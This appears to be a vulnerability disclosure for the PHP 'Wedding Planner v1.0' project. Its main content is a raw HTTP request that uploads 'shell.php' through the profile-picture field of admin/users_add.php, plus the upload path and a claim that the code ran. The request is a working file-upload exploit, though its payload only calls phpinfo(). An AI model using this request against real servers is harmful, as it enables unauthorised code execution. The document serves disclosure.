# Wedding Planner v1.0 by pushpam02 has arbitrary code execution (RCE)

BUG_Author: Li4u

vendor: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability url: http://ip/Wedding-Management-PHP/admin/users_add.php

Loophole location: The Add New User function of "User Management" module in the background management system-- > there is an arbitrary file upload vulnerability (RCE) in the picture upload point of "users_add.php" file.

Click "Edit My Account" to save

Request package for file upload：

```sql
POST /Wedding-Management-PHP/admin/users_add.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Wedding-Management-PHP/admin/users_add.php
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------306421971929630
Content-Length: 1236

-----------------------------306421971929630
Content-Disposition: form-data; name="submit"


-----------------------------306421971929630
Content-Disposition: form-data; name="firstname"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="lastname"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="email"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="username"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="password"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="password2"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="gender"

m
-----------------------------306421971929630
Content-Disposition: form-data; name="address"

1
-----------------------------306421971929630
Content-Disposition: form-data; name="designation"

0
-----------------------------306421971929630
Content-Disposition: form-data; name="profile_picture"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------306421971929630--
```

The files will be uploaded to this directory \Wedding-Management-PHP\admin\upload\users
![image](https://user-images.githubusercontent.com/54017627/183275407-79db0b11-87da-4d8f-b3e7-7cef566acd0e.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183275416-db2ac9d9-aa52-4b81-a966-74c6bc9a296b.png)
